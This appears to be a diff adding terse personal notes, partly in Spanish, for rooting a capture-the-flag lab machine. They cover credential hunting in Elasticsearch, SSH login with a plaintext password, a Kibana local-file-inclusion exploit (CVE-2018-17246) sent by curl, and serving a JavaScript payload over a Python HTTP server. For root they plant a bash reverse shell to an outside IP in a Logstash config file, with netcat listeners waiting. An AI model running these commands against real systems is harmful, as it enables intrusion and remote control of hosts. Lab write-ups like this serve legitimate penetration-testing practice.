@@ -1,0 +1,52 @@
+cat image
+base64 decode
+
+search indices elasticsearch
+do a query on quotes
+
+find user and pass
+
+then:
+ssh security@10.10.10.115
+
+user: security pass: spanish.is.key
+
+ROOT:
+
+(ss -ntlp -> http://127.0.0.1:5601)
+
+CVE: https://github.com/mpgn/CVE-2018-17246
+
+create file in security user
+
+(ver ip: ip a s tun0 )
+
+nc -nlvp 9999
+
+curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/goz.js'
+
+(verficar ip no shell.js!)
+
+- goz.js
+python -m SimpleHTTPServer 8000
+curl http://10.10.12.182:8000/goz.js --output goz.js
+
+GOT IT!
+Final ROOT part:
+
+- cd /etc/logstash/conf.d
+
+cd /opt/kibana/
+logstash_* <- payload goes here (this file does not exist!)
+
+SEE:
+https://www.elastic.co/blog/a-practical-introduction-to-logstash
+
+Create file w nc listener
+nc -nlvp 8080
+echo "Ejecutar comando : bash -i >& /dev/tcp/10.10.12.182/8080 0>&1" > logstash_payload 
+
+GOT ROOT!
+
+
+
